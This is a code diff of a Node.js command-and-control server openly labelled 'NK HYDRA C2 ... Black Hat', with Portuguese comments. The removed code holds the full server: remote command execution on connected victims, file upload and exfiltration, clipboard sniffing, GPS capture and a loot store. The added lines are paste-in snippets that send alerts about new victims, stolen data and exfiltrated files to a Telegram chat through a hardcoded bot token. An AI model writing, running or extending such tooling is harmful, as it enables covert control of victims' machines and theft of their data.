@@ -1,208 +1,49 @@
-// NK HYDRA C2 SERVER v7.0 (Warlord Edition - Black Hat Aprimorado)
-const express = require('express');
-const http = require('http');
-const { Server } = require('socket.io');
-const cors = require('cors');
-const fs = require('fs'); // Para persistência de loot
-const path = require('path'); // Para caminhos de arquivo
+// --- Adicione no topo do seu server.js, junto com os outros 'require' ---
+const TelegramBot = require('node-telegram-bot-api');
 
-const app = express();
-const server = http.createServer(app);
-const io = new Server(server, { cors: { origin: "*" }, maxHttpBufferSize: 1e8 }); 
+// --- Configurações do Telegram (MUDE AQUI!) ---
+const TELEGRAM_BOT_TOKEN = '7013465399:AAGJKHnWPnzVJjJEs4rty936dtm3Vm123yQ'; // Pega no @BotFather
+const TELEGRAM_CHAT_ID = '-1002186646587';       // Pega no @userinfobot
 
-app.use(cors());
-app.use(express.json());
-app.use(express.static(path.join(__dirname, 'public'))); // Servir arquivos estáticos (se tiver)
+const telegramBot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
 
-let agents = new Map();
-let loot = [];
-const LOOT_FILE = 'loot.json';
-
-// --- FUNÇÕES DE PERSISTÊNCIA DE LOOT ---
-const loadLoot = () => {
-    if (fs.existsSync(LOOT_FILE)) {
-        try {
-            const data = fs.readFileSync(LOOT_FILE, 'utf8');
-            loot = JSON.parse(data);
-            console.log(`[SYSTEM] Loot carregado de ${LOOT_FILE}. Total: ${loot.length}`);
-        } catch (e) {
-            console.error(`[ERROR] Falha ao carregar loot de ${LOOT_FILE}:`, e);
-            loot = [];
-        }
+// Função pra enviar mensagem pro Telegram
+const sendTelegramMessage = (message) => {
+    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
+        telegramBot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'HTML' })
+            .catch(e => console.error('[TELEGRAM_ERROR] Falha ao enviar mensagem:', e.message));
     }
 };
 
-const saveLoot = () => {
-    fs.writeFile(LOOT_FILE, JSON.stringify(loot, null, 2), (err) => {
-        if (err) console.error(`[ERROR] Falha ao salvar loot em ${LOOT_FILE}:`, err);
-    });
-};
+// --- Modificações no seu código existente ---
 
-// Carregar loot ao iniciar o servidor
-loadLoot();
-
-// --- TACTICAL DASHBOARD (AGORA INTERATIVO COM CLIENT-SIDE JS) ---
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'dashboard.html')); // Servir o novo dashboard HTML
-});
-
-// --- API Endpoints for Pentest Tools ---
-app.get('/api/status', (req, res) => {
-    res.json({ status: 'online', agents: agents.size, uptime: process.uptime() });
-});
-
-app.get('/api/agents', (req, res) => {
-    const list = [];
-    agents.forEach((agentData, id) => list.push({ id, ...agentData }));
-    res.json(list);
-});
-
-app.get('/api/loot', (req, res) => {
-    res.json(loot);
-});
-
-// Endpoint para pegar o conteúdo completo de um item de loot
-app.get('/api/loot/:index', (req, res) => {
-    const index = parseInt(req.params.index);
-    if (index >= 0 && index < loot.length) {
-        res.json(loot[index]);
-    } else {
-        res.status(404).send('Loot item not found');
-    }
-});
-
-// 3. Webhook for HTTP Exfiltration
-app.post('/exfil', (req, res) => {
-    const data = req.body;
-    const timestamp = new Date().toISOString();
-    const newLootItem = {
-        time: timestamp,
-        agentId: data.agentId || 'UNKNOWN_HTTP', // Agente pode enviar seu ID
-        type: data.type || 'HTTP_EXFIL',
-        data: data.payload || JSON.stringify(data)
-    };
-    loot.unshift(newLootItem);
-    saveLoot(); // Salva o loot
-    io.emit('loot_update', newLootItem); // Notifica o dashboard
-    io.emit('log', `[HTTP EXFIL from ${newLootItem.agentId}] ${String(newLootItem.data).substring(0, 100)}...`);
-    res.send('ACK');
-});
-
-io.on('connection', (socket) => {
-    // 1. Identificação do Agente/UI
-    socket.on('identify', ({ type, id, os, ip }) => { // Agente pode enviar mais dados
+// 1. No evento 'identify' quando um agente conecta:
+// Substitua: console.log(`[+] AGENT ONLINE: ${id} (${agents.get(id).ip})`);
+// Por:
         if (type === 'agent') {
             agents.set(id, { 
                 socketId: socket.id, 
                 lastSeen: new Date().toISOString(), 
-                ip: ip || socket.handshake.address, // IP do agente ou do socket
-                os: os || 'Unknown', // Sistema operacional do agente
-                capabilities: ['gps', 'clipboard', 'exec', 'file_read', 'file_write'] // Capacidades do agente
+                ip: ip || socket.handshake.address, 
+                os: os || 'Unknown', 
+                capabilities: ['gps', 'clipboard', 'exec', 'file_read', 'file_write'] 
             });
-            console.log(`[+] AGENT ONLINE: ${id} (${agents.get(id).ip})`);
-            io.emit('log', `[SYSTEM] NEW NODE DETECTED: ${id} (${agents.get(id).ip})`);
+            const agentInfo = agents.get(id);
+            const connectMsg = `🔥 **NOVO AGENTE ONLINE!** 🔥\nID: <b>${id}</b>\nIP: <b>${agentInfo.ip}</b>\nOS: <b>${agentInfo.os}</b>`;
+            console.log(`[+] AGENT ONLINE: ${id} (${agentInfo.ip})`);
+            io.emit('log', `[SYSTEM] NEW NODE DETECTED: ${id} (${agentInfo.ip})`);
             io.emit('agents_update', Array.from(agents.values()).map(a => ({ id: Array.from(agents.keys()).find(key => agents.get(key).socketId === a.socketId), ...a })));
+            sendTelegramMessage(connectMsg); // <-- AQUI! Notifica no Telegram
         } else {
             console.log('[+] COMMANDER UI CONNECTED');
-            // Envia o estado atual para a UI recém-conectada
             socket.emit('agents_update', Array.from(agents.values()).map(a => ({ id: Array.from(agents.keys()).find(key => agents.get(key).socketId === a.socketId), ...a })));
             socket.emit('loot_update_initial', loot);
+            sendTelegramMessage('💻 **Commander UI Conectada!**'); // <-- AQUI! Notifica no Telegram
         }
-    });
 
-    // 2. Comandos Gerais (UI -> Agente)
-    socket.on('cmd', (data) => {
-        const { cmd, target } = data;
-        if (target && target !== 'all') {
-            const agentData = agents.get(target);
-            if (agentData) {
-                io.to(agentData.socketId).emit('exec', { cmd });
-                io.emit('log', `[CMD] -> ${target}: ${cmd}`);
-            } else {
-                io.emit('log', `[ERR] Target ${target} not found.`);
-            }
-        } else {
-            agents.forEach(agentData => io.to(agentData.socketId).emit('exec', { cmd }));
-            io.emit('log', `[CMD] -> SWARM: ${cmd}`);
-        }
-    });
-
-    // 3. Upload de Arquivos (UI -> Agente)
-    socket.on('upload_file', (data) => {
-        const { target, filename, b64content } = data;
-        const payload = { cmd: `write_file ${filename} ${b64content}` }; // Agente precisa implementar 'write_file'
-        
-        if (target && target !== 'all') {
-            const agentData = agents.get(target);
-            if (agentData) {
-                io.to(agentData.socketId).emit('exec', payload);
-                io.emit('log', `[UPLOAD] Sending ${filename} to ${target}...`);
-            }
-        } else {
-            agents.forEach(agentData => io.to(agentData.socketId).emit('exec', payload));
-            io.emit('log', `[UPLOAD] Broadcasting ${filename} to SWARM...`);
-        }
-    });
-
-    // 4. Download de Arquivos (UI -> Agente -> C2)
-    socket.on('request_file_from_agent', ({ target, filepath }) => {
-        const agentData = agents.get(target);
-        if (agentData) {
-            // Agente precisa implementar 'read_file' que envia 'file_content_from_agent'
-            io.to(agentData.socketId).emit('exec', { cmd: `read_file ${filepath}` }); 
-            io.emit('log', `[DOWNLOAD] Requesting ${filepath} from ${target}...`);
-        } else {
-            io.emit('log', `[ERR] Target ${target} not found for file download.`);
-        }
-    });
-
-    socket.on('file_content_from_agent', (data) => {
-        const { from, filename, b64content, error } = data;
-        if (error) {
-            io.emit('log', `[DOWNLOAD_ERROR from ${from}] ${error}`);
-            return;
-        }
-        const timestamp = new Date().toISOString();
-        const newLootItem = {
-            time: timestamp,
-            agentId: from,
-            type: 'FILE_EXFIL',
-            filename: filename,
-            data: b64content // Armazena o conteúdo base64 completo
-        };
-        loot.unshift(newLootItem);
-        saveLoot();
-        io.emit('loot_update', newLootItem);
-        io.emit('log', `[FILE EXFIL from ${from}] ${filename} (${b64content.length} bytes base64)`);
-    });
-
-    // 5. Controle de Sniffer de Clipboard (UI -> Agente)
-    socket.on('start_sniffer_cmd', ({ target }) => {
-        const agentData = agents.get(target);
-        if (agentData) {
-            io.to(agentData.socketId).emit('exec', { cmd: `start_clipboard_sniffer` }); // Agente precisa implementar
-            io.emit('log', `[SNIFFER] Starting clipboard sniffer on ${target}...`);
-        } else {
-            io.emit('log', `[ERR] Target ${target} not found for sniffer control.`);
-        }
-    });
-
-    socket.on('stop_sniffer_cmd', ({ target }) => {
-        const agentData = agents.get(target);
-        if (agentData) {
-            io.to(agentData.socketId).emit('exec', { cmd: `stop_clipboard_sniffer` }); // Agente precisa implementar
-            io.emit('log', `[SNIFFER] Stopping clipboard sniffer on ${target}...`);
-        } else {
-            io.emit('log', `[ERR] Target ${target} not found for sniffer control.`);
-        }
-    });
-
-    // 6. Logs e Exfiltração (Agente -> C2)
-    socket.on('stream_log', (data) => {
-        const { from, output, type } = data; // Agente pode enviar um 'type' para o loot
-        const timestamp = new Date().toISOString();
-
-        // Capture loot se marcado ou se for um tipo específico
+// 2. No evento 'stream_log' quando houver loot:
+// Substitua: io.emit('loot_update', newLootItem);
+// Por:
         if (output.includes('[DATA_START]') || output.includes('[SNIFFER]') || type === 'CLIPBOARD_DATA' || type === 'NMAP_SCAN' || type === 'GPS_DATA') {
              const newLootItem = {
                  time: timestamp,
@@ -212,28 +53,40 @@ io.on('connection', (socket) => {
              };
              loot.unshift(newLootItem);
              saveLoot();
-             io.emit('loot_update', newLootItem); // Notifica o dashboard
+             io.emit('loot_update', newLootItem);
+             // <-- AQUI! Notifica loot importante no Telegram
+             const lootMsg = `💰 **NOVO LOOT!** 💰\nAgente: <b>${from}</b>\nTipo: <b>${type || 'GENERIC_LOOT'}</b>\nDados: <code>${String(output).substring(0, 200)}...</code>`;
+             sendTelegramMessage(lootMsg);
         }
-        io.emit('log', `[${from}] ${output}`); // Envia para o dashboard
-    });
+        io.emit('log', `[${from}] ${output}`);
 
-    socket.on('disconnect', () => {
-       let disconnectedAgentId = null;
-       agents.forEach((agentData, id) => {
-           if(agentData.socketId === socket.id) {
-               disconnectedAgentId = id;
-               agents.delete(id);
-           }
-       });
+// 3. No evento 'file_content_from_agent' quando um arquivo é exfiltrado:
+// Substitua: io.emit('loot_update', newLootItem);
+// Por:
+        const timestamp = new Date().toISOString();
+        const newLootItem = {
+            time: timestamp,
+            agentId: from,
+            type: 'FILE_EXFIL',
+            filename: filename,
+            data: b64content
+        };
+        loot.unshift(newLootItem);
+        saveLoot();
+        io.emit('loot_update', newLootItem);
+        // <-- AQUI! Notifica arquivo exfiltrado no Telegram
+        const fileExfilMsg = `💾 **ARQUIVO EXFILTRADO!** 💾\nAgente: <b>${from}</b>\nArquivo: <b>${filename}</b>\nTamanho: <b>${(b64content.length / 1024).toFixed(2)} KB</b>`;
+        sendTelegramMessage(fileExfilMsg);
+        io.emit('log', `[FILE EXFIL from ${from}] ${filename} (${b64content.length} bytes base64)`);
+
+// 4. No evento 'disconnect' quando um agente cai:
+// Substitua: console.log(`[-] AGENT OFFLINE: ${disconnectedAgentId}`);
+// Por:
        if (disconnectedAgentId) {
            console.log(`[-] AGENT OFFLINE: ${disconnectedAgentId}`);
            io.emit('log', `[SYSTEM] NODE OFFLINE: ${disconnectedAgentId}`);
            io.emit('agents_update', Array.from(agents.values()).map(a => ({ id: Array.from(agents.keys()).find(key => agents.get(key).socketId === a.socketId), ...a })));
+           sendTelegramMessage(`💔 **AGENTE OFFLINE:** <b>${disconnectedAgentId}</b>`); // <-- AQUI! Notifica no Telegram
        } else {
            console.log('[-] COMMANDER UI DISCONNECTED');
        }
-    });
-});
-
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`NK HYDRA C2 (Warlord Edition) running on port ${PORT}`));
